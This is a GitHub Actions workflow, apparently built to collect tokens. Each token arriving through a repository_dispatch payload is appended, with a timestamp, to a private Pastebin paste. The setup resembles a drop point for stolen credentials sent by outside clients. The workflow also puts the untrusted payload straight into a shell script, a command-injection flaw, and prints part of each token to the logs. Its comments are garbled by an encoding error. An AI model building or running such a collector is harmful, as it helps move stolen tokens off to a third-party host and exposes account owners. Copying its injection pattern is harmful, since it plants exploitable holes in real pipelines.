name: Auto Save Token to Pastebin

on:
  repository_dispatch:
    types: [new_token]

jobs:
  save-token:
    runs-on: ubuntu-latest
    steps:
    - name: Save token to Pastebin
      env:
        PASTEBIN_API_KEY: ${{ secrets.PASTEBIN_API_KEY }}
        PASTEBIN_PASTE_ID: ${{ secrets.PASTEBIN_PASTE_ID }}
      run: |
        TOKEN="${{ github.event.client_payload.token }}"
        TIMESTAMP=$(date -u +"%Y-%m-%d %H:%M:%S")
        
        echo "üîÑ Processing new token: ${TOKEN:0:15}..."
        
        # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–µ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –ø–∞—Å—Ç—ã
        CURRENT_CONTENT=$(curl -s "https://pastebin.com/raw/$PASTEBIN_PASTE_ID")
        
        # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–π —Ç–æ–∫–µ–Ω
        NEW_CONTENT="$CURRENT_CONTENT"$'\n'"$TIMESTAMP | $TOKEN"
        
        # –û–±–Ω–æ–≤–ª—è–µ–º –ø–∞—Å—Ç—É
        RESPONSE=$(curl -s -X POST https://pastebin.com/api/api_post.php \
          -d "api_dev_key=$PASTEBIN_API_KEY" \
          -d "api_option=edit" \
          -d "api_paste_key=$PASTEBIN_PASTE_ID" \
          -d "api_paste_code=$NEW_CONTENT" \
          -d "api_paste_private=1" \
          -d "api_paste_format=text")
        
        if [ "$RESPONSE" = "Bad API request, invalid permission to edit this paste." ]; then
          echo "‚ùå Cannot edit paste"
          exit 1
        else
          echo "‚úÖ Token successfully added to paste!"
          echo "Paste URL: $RESPONSE"
        fi
